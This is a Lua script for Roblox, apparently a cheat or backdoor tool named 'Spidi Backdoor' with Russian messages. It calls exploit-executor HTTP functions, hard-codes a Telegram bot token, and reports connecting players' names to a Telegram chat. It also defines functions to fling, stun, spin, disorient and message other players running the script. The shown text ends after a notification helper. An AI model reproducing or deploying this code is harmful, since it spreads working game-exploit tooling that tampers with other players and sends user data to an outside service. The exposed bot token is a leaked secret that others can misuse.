local BOT_TOKEN = "8778091630:AAEvqz_bo9fat2Or2Q_XYeeMWS2QBFPMRXc"
local CHAT_ID = nil

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local Debris = game:GetService("Debris")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local SoundService = game:GetService("SoundService")
local TweenService = game:GetService("TweenService")

local function httpRequest(url, method, headers, body)
    local f = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
    if not f then
        return nil
    end
    local args = {
        Url = url,
        Method = method or "GET",
        Headers = headers or {}
    }
    if body then
        args.Body = body
    end
    local ok, res = pcall(f, args)
    if ok and res then
        return res
    else
        return nil
    end
end

local function sendMessage(text)
    if not CHAT_ID then
        return
    end
    local payload = {
        chat_id = CHAT_ID,
        text = text,
        parse_mode = "HTML"
    }
    httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage", "POST", {["Content-Type"] = "application/json"}, HttpService:JSONEncode(payload))
end

local function getChatId()
    local res = httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates", "GET", {})
    if res and res.Body then
        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok and data and data.result and #data.result > 0 then
            CHAT_ID = data.result[#data.result].message.chat.id
            return true
        end
    end
    return false
end

local scriptUsers = {}
local bannedPlayers = {}
local kickedPlayers = {}
local myPlayer = Players.LocalPlayer

local function addScriptUser(player)
    if not scriptUsers[player.UserId] then
        scriptUsers[player.UserId] = player
        sendMessage("🟢 <b>"..player.Name.."</b> подключился к Spidi Backdoor!")
    end
end

addScriptUser(myPlayer)

local marker = Instance.new("BoolValue")
marker.Name = "SpidiUser"
marker.Parent = myPlayer

local function findPlayer(input)
    if not input or input == "" then
        return nil, "❌ Введи ник или номер"
    end
    if input:lower() == "all" then
        local all = {}
        for _, p in pairs(Players:GetPlayers()) do
            if scriptUsers[p.UserId] and p ~= myPlayer then
                table.insert(all, p)
            end
        end
        return all, "all"
    end
    local users = {}
    for _, p in pairs(Players:GetPlayers()) do
        if scriptUsers[p.UserId] then
            table.insert(users, p)
        end
    end
    local num = tonumber(input)
    if num and users[num] then
        return users[num]
    end
    input = input:lower()
    local matches = {}
    for _, p in pairs(users) do
        if p.Name:lower():find(input, 1, true) or p.DisplayName:lower():find(input, 1, true) then
            table.insert(matches, p)
        end
    end
    if #matches == 1 then
        return matches[1]
    elseif #matches > 1 then
        local names = {}
        for _, p in pairs(matches) do
            table.insert(names, p.Name)
        end
        return nil, "Найдено несколько: "..table.concat(names, ", ")
    else
        return nil, "Игрок не найден"
    end
end

local function getScriptUserList()
    local list = {}
    local i = 1
    for _, p in pairs(Players:GetPlayers()) do
        if scriptUsers[p.UserId] then
            table.insert(list, i..". "..p.Name)
            i = i + 1
        end
    end
    return list
end

local function playMusic(target, soundId)
    if not target or not soundId then
        return
    end
    local oldSound = target:FindFirstChild("ClientMusic")
    if oldSound then
        oldSound:Destroy()
    end
    local sound = Instance.new("Sound")
    sound.Name = "ClientMusic"
    sound.SoundId = "rbxassetid://" .. tostring(soundId)
    sound.Volume = 1
    sound.Looped = true
    sound.Parent = target
    sound:Play()
end

local function stopMusic(target)
    if not target then
        return false
    end
    local sound = target:FindFirstChild("ClientMusic")
    if sound then
        sound:Stop()
        sound:Destroy()
        return true
    end
    return false
end

local messageCooldown = {}
local function canSendMessage(player)
    local userId = player.UserId
    local last = messageCooldown[userId] or 0
    if tick() - last < 0.3 then
        return false
    end
    messageCooldown[userId] = tick()
    return true
end

local function desorientPlayer(target)
    local char = target.Character
    if not char then
        return
    end
    local camera = Workspace.CurrentCamera
    if not camera then
        return
    end
    camera.CameraType = Enum.CameraType.Scriptable
    local startTime = tick()
    local connection
    connection = RunService.RenderStepped:Connect(function()
        if tick() - startTime >= 3 then
            connection:Disconnect()
            camera.CameraType = Enum.CameraType.Custom
            return
        end
        camera.CFrame = camera.CFrame * CFrame.Angles(math.rad(math.random(-15, 15)), math.rad(25), math.rad(math.random(-10, 10)))
    end)
end

local isFpsCapped = false
local function toggleFps()
    isFpsCapped = not isFpsCapped
    setfpscap(isFpsCapped and 10 or 60)
    return isFpsCapped
end

local function sayMessage(target, msg)
    if not target then
        return
    end
    local chatChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
    if chatChannel then
        chatChannel:SendAsync(msg)
        return
    end
    local legacyRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if legacyRemote then
        local say = legacyRemote:FindFirstChild("SayMessageRequest")
        if say then
            say:FireServer(msg, "All")
        end
    end
end

local stunnedPlayers = {}
local function stunPlayer(target)
    local char = target.Character
    if not char then
        return
    end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then
        return
    end
    local origSpeed = hum.WalkSpeed
    local origJump = hum.JumpPower
    hum.WalkSpeed = 0
    hum.JumpPower = 0
    stunnedPlayers[target.UserId] = {speed = origSpeed, jump = origJump}
    task.delay(3, function()
        if stunnedPlayers[target.UserId] then
            local data = stunnedPlayers[target.UserId]
            local h = target.Character and target.Character:FindFirstChild("Humanoid")
            if h then
                h.WalkSpeed = data.speed
                h.JumpPower = data.jump
            end
            stunnedPlayers[target.UserId] = nil
        end
    end)
end

local function flingPlayer(target)
    local char = target.Character
    if not char then
        return
    end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not (hrp and hum) then
        return
    end
    hum.Sit = true
    local dirX = math.random() > 0.5 and 1 or -1
    local dirZ = math.random() > 0.5 and 1 or -1
    hrp.AssemblyLinearVelocity = Vector3.new(math.random(200, 400) * dirX, math.random(300, 500), math.random(200, 400) * dirZ)
end

local spinningPlayers = {}
local function spinPlayer(target, speed)
    speed = speed or 1
    speed = math.clamp(speed, 0.5, 10)
    if spinningPlayers[target.UserId] then
        spinningPlayers[target.UserId] = nil
    end
    local char = target.Character
    if not char then
        return false
    end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then
        return false
    end
    local running = true
    spinningPlayers[target.UserId] = {running = true}
    spawn(function()
        while running and spinningPlayers[target.UserId] and spinningPlayers[target.UserId].running do
            if not target.Character then
                break
            end
            local h = target.Character:FindFirstChild("HumanoidRootPart")
            if h then
                h.CFrame = h.CFrame * CFrame.Angles(0, math.rad(18 * speed), 0)
            end
            task.wait(0.05)
        end
    end)
    return true
end

local function unspinPlayer(target)
    if spinningPlayers[target.UserId] then
        spinningPlayers[target.UserId].running = false
        spinningPlayers[target.UserId] = nil
        local char = target.Character
        if char then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.CFrame = CFrame.new(hrp.Position)
            end
        end
        return true
    end
    return false
end

local function showNotification(target, text, duration)
    duration = duration or 5
    local gui = target:FindFirstChild("PlayerGui")
    if not gui then
        return
    end
    local screen = Instance.new("ScreenGui")
    screen.Name = "SpidiNotif"
    screen.ResetOnSpawn = false
    screen.Parent = gui
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 450, 0, 50)
    frame.Position = UDim2.new(0.5, -225, 0, 20)
    frame.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 0
    frame.Parent = screen
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = frame
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(0, 255, 0)
    stroke.Thickness = 1
    stroke.Parent = frame
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, -20, 1, 0)
    textLabel.Position = UDim2.new(0, 10, 0, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = text or ""
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextSize = 16
    textLabel.Font = Enum.Font.Gotham
    textLabel.TextXAlignment = Enum.TextXAlignment.Center
    textLabel.TextWrapped = true
    textLabel.Parent = frame
    frame.BackgroundTransparency = 1
    frame.Position = UDim2.new(0.5, -225, 0, -80)
    TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        BackgroundTransparency = 0.1,
        Position = UDim2.new(0.5, -225, 0, 20)
    }):Play()
    game:GetService("Debris"):AddItem(screen, duration)
end

